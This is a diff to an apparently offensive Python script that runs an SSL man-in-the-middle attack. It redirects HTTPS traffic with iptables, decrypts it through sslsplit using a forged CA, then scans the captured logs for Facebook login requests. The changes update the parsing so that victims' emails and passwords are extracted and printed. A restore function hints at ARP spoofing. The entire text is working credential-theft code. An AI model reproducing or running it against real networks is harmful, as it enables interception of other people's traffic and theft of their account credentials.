@@ -52,15 +52,10 @@ def sslsplit():
         "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443",
         shell=True,
     )
-    subprocess.run("touch sslsplit", shell=True)
-    """
-        Run in debug mode (-D), 
-        log the connections (-L sslsplit), 
-        specify the key (-k ca.key), 
-        specify the cert (-c ca.crt), 
-        specify ssl (ssl), 
-        configure the proxy (0.0.0.0 8443 tcp 0.0.0.0 8080)
-    """
+    subprocess.run(
+        "touch sslsplit", 
+        shell=True
+    )
     subprocess.Popen(
         "sslsplit -D -L ./sslsplit -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080",
         shell=True,
@@ -74,12 +69,12 @@ def sslsplit():
         host = False
         for line in f.readlines():
             line = line.decode(errors="ignore")
-            if "Host: facebook.com" in line:
+            if "Host: www.facebook.com" in line:
                 host = True
-            if host == True and "username" in line and "password" in line:
+            if host == True and "email" in line and "pass" in line:
                 user = line.split("&")
-                print("Username: ", user[1][9:])
-                print("Password: ", user[2][9:])
+                print("Email: ", user[2][6:])
+                print("Password: ", user[3][5:])
 
 def restore(destination_ip, source_ip):
     destination_mac = scan[destination_ip]
